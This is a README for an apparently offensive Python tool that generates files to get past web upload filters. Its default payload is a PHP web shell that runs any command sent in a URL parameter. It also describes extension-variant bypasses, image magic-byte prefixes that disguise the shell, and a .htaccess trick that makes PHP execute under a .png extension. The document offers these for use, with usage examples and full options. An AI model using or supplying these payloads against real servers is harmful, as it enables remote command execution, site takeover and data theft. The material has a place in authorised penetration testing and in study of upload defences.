# generate-file-upload
Generate some payload to bypass restriction when you perform a file upload

```
python upfile.py
```
Generate in `Payloads/` all extension for PHP

Default name : `payload`

Default file : `PHP`

Default payload : `<?php system($_GET["cmd"]); ?>`

-----

## Exemple of usage :
```
python upfile.py -b
```
Generate all bypass for PHP


```
python upfile.py -n test -p test -ext php
```
Generate file named `test.php` which contain `test`


```
python upfile.py -b -m png
```
Generate all files bypass for PHP, which contain `magicNumber + payload`


```
python upfile.py -ext png -ht png
```
Generate `.htaccess` which allow execution of php whith extension .png and create `paylaod.png`

-----

## Options
```
usage: upfile.py [-h] [-d] [-p <payload>] [-f {php}] [-ext <ext>] [-b] [-n <name>] [-m {png,jpg}] [-ht <ext>]

Generate some payload to bypass restriction when you perform a file upload

options:
  -h, --help            show this help message and exit
  -d, --debug           Seen the debug to see the process
  -p <payload>, --payload <payload>
                        The payload in the files
  -f {php}, --file {php}
                        The type of the files
  -ext <ext>, --extension <ext>
                        Generate the payload with specific extension
  -b, --bypass          Bypass the restriction
  -n <name>, --name <name>
                        Name of the file
  -m {png,jpg}, --magic {png,jpg}
                        Magic Header, add the magics numbers before the payload
  -ht <ext>, --htaccess <ext>
                        Creates in addition a .htaccess file, which allow execution of php whith extension that you
                        have chosen
   ```                     
